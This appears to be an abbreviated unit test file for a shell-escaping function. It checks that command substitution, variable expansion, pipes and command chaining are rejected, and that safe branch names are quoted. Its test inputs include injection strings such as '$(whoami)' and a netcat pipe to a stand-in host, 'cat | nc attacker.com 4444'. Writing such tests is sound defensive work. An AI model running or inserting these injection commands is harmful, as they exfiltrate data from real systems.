...
describe("Security Tests - Command Injection Prevention", () => {
  describe("shellEscapeSingleQuotes", () => {
    test("should reject null bytes", () => {
      expect(() => shellEscapeSingleQuotes("hello\x00world")).toThrow(
        "null byte",
      );
    });
    ...
    test("should reject command substitution $()", () => {
      expect(() => shellEscapeSingleQuotes("$(whoami)")).toThrow(
        "dangerous pattern",
      );
    });
    ...
    test("should reject variable substitution ${}", () => {
      expect(() => shellEscapeSingleQuotes("${HOME}")).toThrow(
        "dangerous pattern",
      );
    });
    ...
    test("should reject pipe operators", () => {
      expect(() =>
        shellEscapeSingleQuotes("cat | nc attacker.com 4444"),
    ...
    test("should reject command chaining", () => {
      expect(() => shellEscapeSingleQuotes("cmd; malicious")).toThrow(
        "dangerous pattern",
      );
      expect(() => shellEscapeSingleQuotes("cmd && malicious")).toThrow(
        "dangerous pattern",
    ...
    test("should handle safe inputs correctly", () => {
      ...
      expect(shellEscapeSingleQuotes("feature/test-123")).toBe(
        "'feature/test-123'",
      );
